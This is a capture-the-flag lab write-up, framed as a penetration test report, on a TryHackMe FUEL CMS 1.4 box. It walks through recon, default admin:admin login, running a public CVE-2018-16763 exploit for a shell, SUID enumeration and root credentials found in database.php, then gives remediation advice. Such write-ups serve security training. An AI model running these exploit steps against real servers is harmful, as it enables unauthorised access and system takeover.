
#### A THM Room

##### By Sovren 

---

# Executive Summary

A penetration test was conducted against the target web server hosting a **FUEL CMS** web application. The objective of the assessment was to identify security vulnerabilities that could allow unauthorized access to the system or compromise sensitive data.

During the engagement, several critical security weaknesses were discovered. The application used **default administrative credentials**, allowing immediate access to the CMS management interface. Additionally, the version of **FUEL CMS (v1.4)** deployed on the server is vulnerable to **remote code execution (RCE)** via the publicly documented vulnerability **CVE-2018-16763**.

Exploitation of this vulnerability allowed remote command execution on the server, providing shell access as the **www-data** user. Further enumeration revealed sensitive configuration files containing **database credentials for the root user**, enabling privilege escalation and complete system compromise.

The combination of **default credentials**, **unpatched software vulnerabilities**, and **exposed credentials in configuration files** resulted in **full administrative control of the system**.

Key impacts include:

- Remote code execution on the web server
    
- Unauthorized access to the application backend
    
- Exposure of database credentials
    
- Privilege escalation to root
    
- Full system compromise
    

Immediate remediation is strongly recommended, including patching the vulnerable CMS, removing default credentials, and securing sensitive configuration files.


---

# Reconnaissance 

Initial reconnaissance revealed that the website is powered by FUEL CMS.

The application used default administrative credentials, allowing direct access to the CMS administration panel:
`admin:admin`


# Scanning & Enumeration

### Nmap

A network scan was performed using Nmap to identify open ports and services.
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-title: Welcome to FUEL CMS
```

- The server is running Apache 2.4.18 on Ubuntu
    
- The application root page confirms FUEL CMS
    
- The `/robots.txt` file references a hidden directory `/fuel/`

### Gobuster

`gobuster dir -u http://10.112.138.192 -w /usr/share/wordlists/dirb/big.txt`
```
0                    (Status: 200) [Size: 16599]
@                    (Status: 400) [Size: 1134]
asdfjkl;             (Status: 400) [Size: 1134]
assets               (Status: 301) [Size: 317] [--> http://10.112.138.192/assets/]
home                 (Status: 200) [Size: 16599]
index                (Status: 200) [Size: 16599]
lost+found           (Status: 400) [Size: 1134]
offline              (Status: 200) [Size: 70]
robots.txt           (Status: 200) [Size: 30]
server-status        (Status: 403) [Size: 302]
sitemap_xml          (Status: 200) [Size: 400]
```

###### /robots.txt 

User-agent: *
Disallow: /fuel/


# Exploitation 

The version of FUEL CMS (1.4) used by the target is vulnerable to **remote code execution** via:

**CVE-2018-16763**

A public exploit is available:
https://github.com/p0dalirius/CVE-2018-16763-FuelCMS-1.4.1-RCE

This vulnerability allows attackers to execute arbitrary system commands without authentication.

###### Workflow:

Clone the repo:
`git clone https://github.com/p0dalirius/CVE-2018-16763-FuelCMS-1.4.1-RCE.git`

cd into the directory:
`cd CVE-2018-16763-FuelCMS-1.4.1-RCE`

Run the exploit against the target:
`python3 console.py -t [target.ip]`

Shell is then achieved and the first flag can be found at /home/www-data/flag.txt


# Privilege Escalation

After gaining shell access, local enumeration was performed to identify potential privilege escalation paths.

`sudo -l` 
-permission denied

`uname -a`
```
Linux ubuntu 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

###### SUID Files
```
[webshell]> find / -perm -4000 2>/dev/null
/usr/sbin/pppd
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/vmware-user-suid-wrapper
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/passwd
/bin/su
/bin/ping6
/bin/ntfs-3g
/bin/ping
/bin/mount
/bin/umount
/bin/fusermount
```

## Credential Discovery

Further enumeration revealed sensitive credentials stored in a configuration file:

/var/www/html/fuel/application/config/database.php

The file contained database credentials including **root credentials**:

```
username = root  
password = mememe
```

Because these credentials correspond to the root user, they allow privileged access to the system.

Using these credentials, full administrative privileges were obtained.

# Impact

The vulnerabilities discovered during this assessment allow an attacker to fully compromise the system.

Potential impacts include:

- Unauthorized access to the CMS administration panel
    
- Remote execution of arbitrary commands
    
- Exposure of sensitive configuration files
    
- Credential theft
    
- Privilege escalation to root
    
- Complete system takeover
    

An attacker exploiting these issues could modify the website, exfiltrate sensitive data, pivot to internal systems, or deploy persistent malware.

---

# Recommendations

To mitigate the identified risks, the following actions are recommended:

### 1. Update FUEL CMS

Upgrade to a patched version of FUEL CMS that addresses **CVE-2018-16763**.

### 2. Remove Default Credentials

Ensure all default credentials are changed immediately and enforce strong password policies.

### 3. Protect Configuration Files

Sensitive configuration files such as `database.php` should not contain plaintext credentials accessible by web processes.

### 4. Restrict Administrative Interfaces

Limit access to administrative panels via IP restrictions, VPN access, or authentication gateways.

### 5. Implement Security Monitoring

Deploy logging and intrusion detection systems to identify suspicious activity.